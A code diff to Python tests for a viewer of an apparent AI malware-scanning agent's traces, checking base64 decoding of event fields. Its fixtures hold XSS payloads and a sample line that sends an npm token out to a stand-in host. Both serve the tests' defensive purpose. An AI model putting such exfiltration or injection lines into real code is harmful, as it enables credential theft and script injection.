@@ -209,22 +209,94 @@ def test_reference_labels_missing_file_is_empty(tmp_path):
     assert reference_labels(tmp_path / "missing.csv") == {}
 
 
-def test_bundled_base64_sample_keeps_package_text_encoded(tmp_path):
-    """Trace format from 20/11/2026: package text travels as base64; the viewer decodes it for display."""
-    import base64
+def test_bundled_base64_sample_is_decoded_for_display_only(tmp_path):
+    """The sample stays base64 on disk; the API returns the decoded text, which the page shows with textContent."""
+    sample_dir = Path(__file__).parents[1] / "viewer" / "sample_traces"
+    package = "base64-preview-demo@1.0.0"
+    on_disk = (sample_dir / trace_filename(package)).read_text(encoding="utf-8")
+    assert "<img src=x onerror=alert(1)>" not in on_disk and "data_preview_b64" in on_disk
     server = make_server(tmp_path / "reports", 0)
     thread = Thread(target=server.serve_forever, daemon=True)
     thread.start()
     try:
-        package = "base64-preview-demo@1.0.0"
         status, _, body = request(server, "GET", f"/api/trace?run=sample_traces&pkg={quote(package, safe='')}&after=-1")
         assert status == 200
-        raw = body.decode("utf-8")
-        assert "<img src=x onerror=alert(1)>" not in raw          # only in base64 on disk and on the wire
-        results = [event for event in json.loads(body) if event["type"] == "tool_result"]
-        assert results and all("data_preview" not in event and event["data_preview_encoding"] == "base64" for event in results)
-        source = base64.b64decode(results[-1]["data_preview_b64"]).decode("utf-8")
-        assert "<img src=x onerror=alert(1)>" in source and "writeFileSync" in source
+        events = json.loads(body)
+        results = [event for event in events if event["type"] == "tool_result"]
+        assert all(not key.endswith(("_b64", "_encoding")) for event in events for key in event)
+        assert "<img src=x onerror=alert(1)>" in results[-1]["data_preview"]
+        assert "writeFileSync" in results[-1]["data_preview"]
+    finally:
+        server.shutdown()
+        server.server_close()
+        thread.join(timeout=2)
+
+
+def test_encoded_free_text_fields_are_decoded_recursively(tmp_path):
+    """Gate B0 21/11: every free-text field may be `<field>_b64` + "base64" or "base64-json" (nested, or null)."""
+    from experiments.encoding import encode_event
+    run_dir = tmp_path / "reports" / "run-enc"
+    run_dir.mkdir(parents=True)
+    package = "enc-demo@1.0.0"
+    verdict = {"package": package, "label": "malicious", "confidence": 0.9, "action": "deny",
+               "description": "Đọc ~/.npmrc rồi gửi đi",
+               "behaviors": [{"behavior": "gửi token", "severity": "high", "evidence": {"file": "a.js", "lines": "3"},
+                              "analysis": "<script>alert(1)</script>"}]}
+    plain = [
+        {"type": "run_start", "model": "m", "max_steps": 15},
+        {"type": "thought", "text": "Mô hình nghĩ: đọc a.js trước"},
+        {"type": "tool_call", "tool": "read_file", "args": {"file": "a.js", "start": 1, "end": 5}},
+        {"type": "tool_result", "tool": "read_file", "ok": True, "summary": "OK", "untrusted": True,
+         "data_preview": "fetch('https://x.invalid/?t=' + process.env.NPM_TOKEN)"},
+        {"type": "verdict", "verdict": verdict, "valid": True, "validation_errors": []},
+        {"type": "decision", "final_label": "malicious", "final_action": "deny", "rule": "R6", "dry_run": True,
+         "reasons": ["Verified malicious behavior"], "evidence_checks": [{"file": "a.js", "lines": "3", "exists": True}],
+         "inputs": None},
+        {"type": "run_end", "elapsed_s": 1.0, "steps": 2},
+    ]
+    lines = []
+    for seq, event in enumerate(plain):
+        record = {**event, "run_id": "run-enc", "package": package, "seq": seq}
+        # an old plain event in the same file must still pass through untouched
+        lines.append(json.dumps(record if seq == 1 else encode_event(record), ensure_ascii=False))
+    (run_dir / trace_filename(package)).write_text("\n".join(lines) + "\n", encoding="utf-8")
+    raw = (run_dir / trace_filename(package)).read_text(encoding="utf-8")
+    assert "base64-json" in raw and "NPM_TOKEN" not in raw and "<script>" not in raw
+
+    server = make_server(tmp_path / "reports", 0)
+    thread = Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    try:
+        status, _, body = request(server, "GET", f"/api/trace?run=run-enc&pkg={quote(package, safe='')}&after=-1")
+        assert status == 200
+        events = json.loads(body)
+        for got, want in zip(events, plain):
+            assert {key: got[key] for key in want} == want
+        assert events[4]["verdict"]["behaviors"][0]["analysis"] == "<script>alert(1)</script>"
+        assert events[5]["inputs"] is None
+        status, _, body = request(server, "GET", "/api/runs/run-enc/packages")
+        [item] = json.loads(body)
+        assert (item["label"], item["action"], item["rule"], item["proposal_label"], item["evidence_ok"]) ==             ("malicious", "deny", "R6", "malicious", 1)
+    finally:
+        server.shutdown()
+        server.server_close()
+        thread.join(timeout=2)
+
+
+def test_undecodable_field_drops_only_its_line(tmp_path):
+    run_dir = tmp_path / "reports" / "run-bad"
+    run_dir.mkdir(parents=True)
+    package = "bad-enc@1.0.0"
+    good = {"type": "run_start", "model": "m", "max_steps": 1, "run_id": "run-bad", "package": package, "seq": 0}
+    bad = {"type": "thought", "text_b64": "abc", "text_encoding": "base64", "run_id": "run-bad", "package": package, "seq": 1}
+    odd = {"type": "thought", "text_b64": "eA==", "text_encoding": "rot13", "run_id": "run-bad", "package": package, "seq": 2}
+    (run_dir / trace_filename(package)).write_text("".join(json.dumps(e) + "\n" for e in (good, bad, odd)), encoding="utf-8")
+    server = make_server(tmp_path / "reports", 0)
+    thread = Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    try:
+        status, _, body = request(server, "GET", f"/api/trace?run=run-bad&pkg={quote(package, safe='')}&after=-1")
+        assert status == 200 and [event["seq"] for event in json.loads(body)] == [0]
     finally:
         server.shutdown()
         server.server_close()
